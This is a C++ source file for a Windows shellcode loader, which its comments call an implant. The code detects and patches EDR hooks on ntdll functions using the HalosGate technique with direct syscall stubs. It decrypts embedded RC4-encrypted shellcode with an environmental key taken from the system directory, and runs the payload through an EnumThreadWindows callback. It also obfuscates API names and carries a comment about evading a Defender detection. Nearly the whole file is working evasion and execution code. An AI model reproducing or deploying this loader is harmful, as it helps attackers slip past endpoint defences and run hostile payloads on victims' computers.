#include <iostream>
#include <Windows.h>
#include <stdio.h>
#include <stdlib.h> 
#include <string>

#pragma comment (lib, "user32")			// For EnumThreadWindows()

using namespace std;

#pragma comment (lib, "ntdll.lib")		// For the Usage of Nt Functions

#define NT_SUCCESS(Status)	(((NTSTATUS)(Status)) >= 0)		// Macro defined in ntapi.h

// ============= Shellcode Encryption ============================
#include "enc_shellcode.h"

#define MAX 100

// Function prototype for SystemFunction033
typedef NTSTATUS(WINAPI* _SystemFunction033)(
	struct ustring* memoryRegion,
	struct ustring* keyPointer);

struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PVOID Buffer;
} _data, key, _data2;

// ============= End: Shellcode Encryption ============================


// [link: https://www.codeproject.com/Questions/103661/how-to-get-current-Process-HANDLE]
// Return value of currentProcess() is a pseudo handle to the current process
// => (HANDLE)-1 => 0xFFFFFFFF" (MSDN)
#define MyCurrentProcess()	((HANDLE)-1)

// HalosGate: Sektor7
#define UP -32
#define DOWN 32

#define _CRT_SECURE_NO_WARNINGS
#pragma warning(disable:4996)


// Ntapi obfuscation:

//unsigned char sNtAllocateVirtualMemory[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
//unsigned char sNtProtectVirtualMemory[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
//unsigned char sNtWriteVirtualMemory[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0x0 };
//unsigned char sNtCreateThreadEx[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x', 0x0 };

const char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0 };

const char ntdll[] = { 'n','t','d','l','l','.','d','l','l', 0 };
const char NtAlloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
const char NtProtect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
const char NtWrite[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y', 0 };
//const char NtCreateTh[] = { 'N','t','C','r','e','a','t','e','T','h','r','e','a','d','E','x', 0 };
//const char NtWait[] = { 'N','t','W','a','i','t','F','o','r','S','i','n','g','l','e','O','b','j','e','c','t', 0 };

// typedefs
// Api obfuscation:
//typedef LPVOID(WINAPI* ConvertThreadToFiber_t) (LPVOID lpParameter);
//typedef LPVOID(WINAPI* CreateFiber_t) (SIZE_T dwStackSize, LPFIBER_START_ROUTINE lpStartAddress, LPVOID lpParameter);
//typedef void (WINAPI* SwitchToFiber_t) (LPVOID lpFiber);

//const char sConvertThreadToFiber[] = { 'C','o','n','v','e','r','t','T','h','r','e','a','d','T','o','F','i','b','e','r', 0 };
//const char sCreateFiber[] = { 'C','r','e','a','t','e','F','i','b','e','r', 0 };
//const char sSwitchToFiber[] = { 'S','w','i','t','c','h','T','o','F','i','b','e','r', 0 };

//ConvertThreadToFiber_t ConvertThreadToFiber_p = (ConvertThreadToFiber_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sConvertThreadToFiber);
//CreateFiber_t CreateFiber_p = (CreateFiber_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sCreateFiber);
//SwitchToFiber_t SwitchToFiber_p = (SwitchToFiber_t)GetProcAddress(GetModuleHandleA((LPCSTR)sKernel32), (LPCSTR)sSwitchToFiber);

EXTERN_C NTSTATUS NtAllocateVirtualMemory(
	HANDLE    ProcessHandle,
	PVOID* BaseAddress,
	ULONG ZeroBits,
	PSIZE_T   RegionSize,
	ULONG     AllocationType,
	ULONG     Protect
);

EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect
);

EXTERN_C NTSTATUS NtWriteVirtualMemory(

	IN HANDLE               ProcessHandle,
	IN PVOID                BaseAddress,
	IN PVOID                Buffer,
	IN ULONG                NumberOfBytesToWrite,
	OUT PULONG              NumberOfBytesWritten OPTIONAL
);
/*
EXTERN_C NTSTATUS NtCreateThreadEx(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN PVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN PVOID lpStartAddress,
	IN PVOID lpParameter,
	IN ULONG Flags,
	IN SIZE_T StackZeroBits,
	IN SIZE_T SizeOfStackCommit,
	IN SIZE_T SizeOfStackReserve,
	OUT PVOID lpBytesBuffer
);

// No Obfuscation -> as no need of that!
EXTERN_C NTSTATUS NtWaitForSingleObject(
	IN HANDLE         Handle,
	IN BOOLEAN        Alertable,
	IN PLARGE_INTEGER Timeout
);
*/

// ====================================================================


//strings
//unsigned char sKernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l', 0x0 };
//unsigned char sNtdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd', 'l', 'l', 0x0 };


void int2hex(int SystemCall)
{
	char hex_string[20];
	sprintf(hex_string, "%X", SystemCall); //convert number to hex
	printf("[+] Sorted SSN %s\n", hex_string);
}

// Sektor7: HalosGate and BRc4 Blog: https://bruteratel.com/release/2022/01/08/Release-Warfare-Tactics/
// SystemCall Stub: First 4 bytes
// opcode: \x4c\x8b\xd1\xb8...

int HookCheck(LPVOID ntapiaddr)
{
	BYTE syscall_stub[] = "\x4c\x8b\xd1\xb8";
	if (memcmp(ntapiaddr, syscall_stub, 4) == 0)
	{
		return 0; // Not Hooked!
	}
	return 1; // Hooked!!!
}

WORD SortSSN(LPVOID ntapiaddr)
{
	WORD SystemCall = NULL;
	
	// Whole SystemCall Stub:
	// First Opcode should be: (If Not Hooked)
	// mov r10, rcx
	// mov rcx, SSN
	if (*((PBYTE)ntapiaddr) == 0x4c
		&& *((PBYTE)ntapiaddr + 1) == 0x8b
		&& *((PBYTE)ntapiaddr + 2) == 0xd1
		&& *((PBYTE)ntapiaddr + 3) == 0xb8
		&& *((PBYTE)ntapiaddr + 6) == 0x00
		&& *((PBYTE)ntapiaddr + 7) == 0x00)
	{
		BYTE high = *((PBYTE)ntapiaddr + 5);
		BYTE low = *((PBYTE)ntapiaddr + 4);
		SystemCall = (high << 8) | low;

		int2hex(SystemCall);

		return SystemCall;
	}
	
	/*
	if (*((PBYTE)ntapiaddr) == 0xe9 || *((PBYTE)ntapiaddr + 3) == 0xe9 || *((PBYTE)ntapiaddr + 8) == 0xe9 ||
		*((PBYTE)ntapiaddr + 10) == 0xe9 || *((PBYTE)ntapiaddr + 12) == 0xe9)
	*/
	
	// If Hooked: jmp <instructions>
	// opcode: \xe9...
	if (*((PBYTE)ntapiaddr) == 0xe9)
	{
		for (WORD idx = 1; idx <= 500; idx++)
		{
			// Check neighbouring Syscall Down the stack:
			if (*((PBYTE)ntapiaddr + idx * DOWN) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * DOWN) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * DOWN) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * DOWN) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * DOWN) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * DOWN) == 0x00)
			{

				BYTE high = *((PBYTE)ntapiaddr + 5 + idx * DOWN);
				BYTE low = *((PBYTE)ntapiaddr + 4 + idx * DOWN);
				SystemCall = (high << 8) | low - idx;

				int2hex(SystemCall);

				return SystemCall;
			}

			// Check neighbouring Syscall Up the stack:
			if (*((PBYTE)ntapiaddr + idx * UP) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * UP) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * UP) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * UP) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * UP) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * UP) == 0x00)
			{
				BYTE high = *((PBYTE)ntapiaddr + 5 + idx * UP);
				BYTE low = *((PBYTE)ntapiaddr + 4 + idx * UP);
				SystemCall = (high << 8) | low + idx;

				int2hex(SystemCall);

				return SystemCall;
			}
		}
	}
}

// Sektor7: HalosGate -> hellsgate.asm
DWORD64 GetsyscallInstr(LPVOID ntapiaddr)
{
	WORD SystemCall = NULL;

	if (*((PBYTE)ntapiaddr) == 0x4c
		&& *((PBYTE)ntapiaddr + 1) == 0x8b
		&& *((PBYTE)ntapiaddr + 2) == 0xd1
		&& *((PBYTE)ntapiaddr + 3) == 0xb8
		&& *((PBYTE)ntapiaddr + 6) == 0x00
		&& *((PBYTE)ntapiaddr + 7) == 0x00)
	{
		// https://github.com/reveng007/MaldevTechniques/tree/main/3.Evasions/SSN_Sort_patch_Hooked_syscalls/project_vs_2022#to-get-syscall-instuction-calculation
		return (INT_PTR)ntapiaddr + 0x12;    // Syscall
	}

	/*
	if (*((PBYTE)ntapiaddr) == 0xe9 || *((PBYTE)ntapiaddr + 3) == 0xe9 || *((PBYTE)ntapiaddr + 8) == 0xe9 ||
		*((PBYTE)ntapiaddr + 10) == 0xe9 || *((PBYTE)ntapiaddr + 12) == 0xe9)
	
	*/

	// If Hooked: jmp <instructions>
	// opcode: \xe9...
	if (*((PBYTE)ntapiaddr) == 0xe9)
	{
		for (WORD idx = 1; idx <= 500; idx++)
		{
			// Check neighbouring Syscall Down the stack:
			if (*((PBYTE)ntapiaddr + idx * DOWN) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * DOWN) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * DOWN) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * DOWN) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * DOWN) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * DOWN) == 0x00)
			{
				return (INT_PTR)ntapiaddr + 0x12;	// syscall
			}

			// Check neighbouring Syscall Up the stack:
			if (*((PBYTE)ntapiaddr + idx * UP) == 0x4c
				&& *((PBYTE)ntapiaddr + 1 + idx * UP) == 0x8b
				&& *((PBYTE)ntapiaddr + 2 + idx * UP) == 0xd1
				&& *((PBYTE)ntapiaddr + 3 + idx * UP) == 0xb8
				&& *((PBYTE)ntapiaddr + 6 + idx * UP) == 0x00
				&& *((PBYTE)ntapiaddr + 7 + idx * UP) == 0x00)
			{
				return (INT_PTR)ntapiaddr + 0x12;	// syscall
			}
		}
	}
}

int PatchIfHooked(LPVOID ntapiaddr)
{
	DWORD oldprotect = 0;

	BYTE SSN = SortSSN(ntapiaddr);
	DWORD64 syscallInst = GetsyscallInstr(ntapiaddr);

	// Sektor7: HalosGate -> hellsgate.asm
	/*
		mov r10, rcx
		mov eax, SSN
		syscall
		ret
	*/
	// From here: https://defuse.ca/online-x86-assembler.htm#disassembly
	BYTE patch[] = { 0x49, 0x89, 0xCA, 0xB8, 0xBC, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3, 0x90, 0x90, 0x90, 0x90 };

	// Syscall Stub: Not Working!!!
	//BYTE patch[] = { 0x4c, 0x8b, 0xd1, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3};
	
	// SSN
	printf("[*] Editng SSN...\n");
	patch[4] = SSN;

	// syscall instruction
	printf("[*] Editng syscall instruction...\n");
	patch[8] = *(BYTE*)syscallInst;
	patch[9] = *(BYTE*)(syscallInst + 0x1);

	//patch[18] = *(BYTE*)syscallInst;
	//patch[19] = *(BYTE*)(syscallInst + 0x1);

	BOOL status1 = VirtualProtect(ntapiaddr, 4096, PAGE_EXECUTE_READWRITE, &oldprotect);
	if (!status1)
	{
		printf("Failed in changing protection (%u)\n", GetLastError());
		return 1;
	}
	std::memcpy(ntapiaddr, patch, sizeof(patch));

	BOOL status2 = VirtualProtect(ntapiaddr, 4096, oldprotect, &oldprotect);
	if (!status2)
	{
		printf("Failed in changing protection back (%u)\n", GetLastError());
		return 1;
	}
	return 0;
}

int main()
{
	PVOID BaseAddress = NULL;
	unsigned int shellcode_size = sizeof(enc_shellcode_bin);
	int ret = 0;

	// ================ HookCheck and Patch NtAllocateVirtualMemory() =============================

	LPVOID pNtAlloc = GetProcAddress(GetModuleHandleA(ntdll), NtAlloc);

	if (HookCheck(pNtAlloc))
	{
		printf("[-] NtAllocateVirtualMemory Hooked\n");
		
		ret = PatchIfHooked(pNtAlloc);

		if (ret != 0)
		{
			printf("[!] Failed in Unhooking NtAllocateVirtualMemory\n");
		}
		printf("\t[+] Hooked NtAllocateVirtualMemory -> Patched\n");
	}
	else
	{
		printf("[+] NtAllocateVirtualMemory Not Hooked\n");
	}

	// ================ End: HookCheck and Patch NtAllocateVirtualMemory() =============================

	SIZE_T shellcode_size2 = sizeof(enc_shellcode_bin);

	ULONG shcSize = (ULONG)shellcode_size;
	//ULONG shcSize1 = (ULONG)shellcode_size2;

	//NTSTATUS status1 = NtAllocateVirtualMemory(MyCurrentProcess(), &BaseAddress, 0, (PULONG)&shcSize1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	NTSTATUS status1 = NtAllocateVirtualMemory(MyCurrentProcess(), &BaseAddress, 0, &shellcode_size2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!NT_SUCCESS(status1))
	{
		printf("[!] Failed in NtAllocateVirtualMemory (%u)\n", GetLastError());
		return 1;
	}

	// ================ HookCheck and Patch NtWriteVirtualMemory() =============================

	LPVOID pNtWrite = GetProcAddress(GetModuleHandleA(ntdll), NtWrite);

	if (HookCheck(pNtWrite))
	{
		printf("[-] NtWriteVirtualMemory Hooked\n");

		if (!PatchIfHooked(pNtWrite))
		{
			printf("[!] Failed in Unhooking NtWriteVirtualMemory\n");
		}
		printf("\t[+] Hooked NtWriteVirtualMemory -> Patched\n");
	}
	else {
		printf("[+] NtWriteVirtualMemory Not Hooked\n");
	}

	// ================ End: HookCheck and Patch NtWriteVirtualMemory() =============================

	// For Erradicating data type issue 
	//ULONG shcSize2 = (ULONG)shellcode_size;
	
	// NTSTATUS  NtWriteStatus1 = NtWriteVirtualMemory(MyCurrentProcess(), BaseAddress, (PVOID)enc_shellcode_bin, shcSize1, NULL);
	NTSTATUS  NtWriteStatus1 = NtWriteVirtualMemory(MyCurrentProcess(), BaseAddress, enc_shellcode_bin, shcSize, NULL);
	//NTSTATUS  NtWriteStatus1 = NtWriteVirtualMemory(MyCurrentProcess(), BaseAddress, enc_shellcode_bin, sizeof(enc_shellcode_bin), NULL);
	if (!NT_SUCCESS(NtWriteStatus1))
	{
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		return 1;
	}

	// ================= RC4 decryption and KEY(Env. Keying Factor with No Initial Recon needed!) ============

	unsigned char sSystemFunction033[] = { 'S','y','s','t','e','m','F','u','n','c','t','i','o','n','0','3','3', 0x0 };
	unsigned char sadvapi32[] = { 'a','d','v','a','p','i','3','2',0x0 };

	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibraryA((LPCSTR)sadvapi32), (LPCSTR)sSystemFunction033);

	char KEY[MAX];
	UINT KEYlen = sizeof(KEY);

	UINT size_key = GetSystemDirectoryA(KEY, KEYlen);

	printf("[*] Retrieving Key at RunTime:\n\t\t[*] Using Environmental Keying with No initial Recon necessary -> %s\n", KEY); //getchar();

	//printf("[+] Retrieved Key length: %d\n", (int)size_key); //getchar();

	// I saw that:
	// 1. In My windows Host: my cpp implant is retrieving: "C:\WINDOWS\system32" via GetSystemDirectoryA()
	// 2. But in my Windows VM: my cpp implant is retrieving: "C:\Windows\system32" via GetSystemDirectoryA()
	// 3. Changing the Whole string to UpperCase(), after retrieving to avoid confusion.

	char _key[18];

	int i = 0, count = 1;
	while (KEY[i] != '\0')
	{
		if (count <= 17)
		{
			//printf("The Character at %d Index Position = %c \n", i, KEY[i]); getchar();
			_key[i] = toupper(KEY[i]);
			//printf("The Character at %d Index Position = %c \n", i, _key[i]);
			i++;
			count++;
		}
		else
		{   // null terminator
			_key[i] = '\0';
			break;
		}
	}

	size_t KEY_18len = sizeof(_key);

	//printf("[+] Stripped Key: %s\n", _key); //getchar();
	//printf("[+] Stripped Key length: %u\n", KEY_18len); //getchar();

	//PVOID buffer = VirtualAlloc(NULL, shellcode_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	// Copy the character array to the allocated memory using memcpy.
	//std::memcpy(buffer, enc_shellcode_bin, shellcode_size);

	//RtlMoveMemory(buffer, enc_shellcode, shellcode_size);	// Caught by Defender as Trojan:Win32/Wacatac.B!ml

	//just setting null values at shellcode, cause why not and why keep two copies in memory
	//memset(enc_shellcode, 0, shellcode_size);

	key.Buffer = (&_key);
	key.Length = sizeof(_key);

	//_data.Buffer = buffer;
	_data.Buffer = BaseAddress;
	_data.Length = shellcode_size;

	// Decrypting shellcode
	if (SystemFunction033(&_data, &key))
	{
		printf("[!] Unable to decrypt Shellcode\n");
	}
	printf("[+] Shellcode Decrypted!\n");

	//ULONG shcSize = (ULONG)shellcode_size;
	//PSIZE_T shcSize1 = (PSIZE_T)shellcode_size;

	// ================= End: RC4 decryption and KEY(Env. Keying Factor with No Initial Recon needed!) ============

	// ================ HookCheck and Patch NtProtectVirtualMemory() =============================

	HANDLE hThread;
	DWORD OldProtect = 0;

	LPVOID pNtProtect = GetProcAddress(GetModuleHandleA(ntdll), NtProtect);

	if (HookCheck(pNtProtect))
	{
		printf("[-] NtProtectVirtualMemory Hooked\n");

		if (!PatchIfHooked(pNtProtect))
		{
			printf("[!] Failed in Unhooking NtProtectVirtualMemory\n");
		}
		printf("\t[+] Hooked NtProtectVirtualMemory -> Patched\n");
	}
	else
	{
		printf("[+] NtProtectVirtualMemory Not Hooked\n");
	}

	// ================ End: HookCheck and Patch NtProtectVirtualMemory() =============================

	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(MyCurrentProcess(), &BaseAddress, &shellcode_size2, PAGE_EXECUTE_READ, &OldProtect);
	//NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(MyCurrentProcess(), &BaseAddress, (PSIZE_T)&dwSize, PAGE_EXECUTE_READ, &OldProtect);
	if (!NT_SUCCESS(NtProtectStatus1))
	{
		printf("[!] Failed in NtProtectVirtualMemory (%u)\n", GetLastError());
		return 1;
	}

	/*
	// ================ HookCheck and Patch NtCreateThreadEx() =============================

	HANDLE hHostThread = INVALID_HANDLE_VALUE;

	LPVOID pNtCreateThreadEx = GetProcAddress(GetModuleHandleA(ntdll), NtCreateTh);
	if (HookCheck(pNtCreateThreadEx))
	{
		printf("[-] NtCreateThreadEx Hooked\n");
		if (!PatchIfHooked(pNtCreateThreadEx))
		{
			printf("[!] Failed in Unhooking NtCreateThreadEx\n");
		}
		printf("\t[+] Hooked NtCreateThreadEx -> Patched\n");
	}
	else {
		printf("[+] NtCreateThreadEx Not Hooked\n");
	}

	// ================ End: HookCheck and Patch NtCreateThreadEx() =============================

	NTSTATUS NtCreateThreadstatus = NtCreateThreadEx(&hHostThread, 0x1FFFFF, NULL, MyCurrentProcess(), (LPTHREAD_START_ROUTINE)BaseAddress, NULL, FALSE, NULL, NULL, NULL, NULL);
	if (!NT_SUCCESS(NtCreateThreadstatus))
	{
		printf("[!] Failed in NtCreateThreadEx (%u)\n", GetLastError());
		return 1;
	}
	*/

	/*
	// ================ HookCheck and Patch NtWaitForSingleObject() =============================

	LARGE_INTEGER Timeout;
	Timeout.QuadPart = -10000000;

	LPVOID pNtWait = GetProcAddress(GetModuleHandleA(ntdll), NtWait);

	if (HookCheck(pNtWait))
	{
		printf("[-] NtWaitForSingleObject Hooked\n");
		if (!PatchIfHooked(pNtWait))
		{
			printf("[!] Failed in Unhooking NtWaitForSingleObject\n");
		}
		printf("\t[+] Hooked NtWaitForSingleObject -> Patched\n");
	}
	else {
		printf("[+] NtWaitForSingleObject Not Hooked\n");
	}

	// ================ End: HookCheck and Patch NtWaitForSingleObject() =============================

	NTSTATUS NTWFSOstatus = NtWaitForSingleObject(hHostThread, FALSE, &Timeout);
	if (!NT_SUCCESS(NTWFSOstatus))
	{
		printf("[!] Failed in NtWaitForSingleObject (%u)\n", GetLastError());
		return 1;
	}
	*/

	printf("\n[*] Running PE via EnumThreadWindows...\n\n");

	EnumThreadWindows(0, (WNDENUMPROC)BaseAddress, 0);

	/*
	printf("\n[*] Creating a fiber that will execute the shellcode...\n");

	// create a fiber that will execute the shellcode
	PVOID shellcodeFiber = CreateFiber_p(NULL, (LPFIBER_START_ROUTINE)BaseAddress, NULL);

	// manually schedule the fiber that will execute our shellcode
	SwitchToFiber_p(shellcodeFiber);
	*/
	//printf("[+] BOOM!\n");

	return 0;
}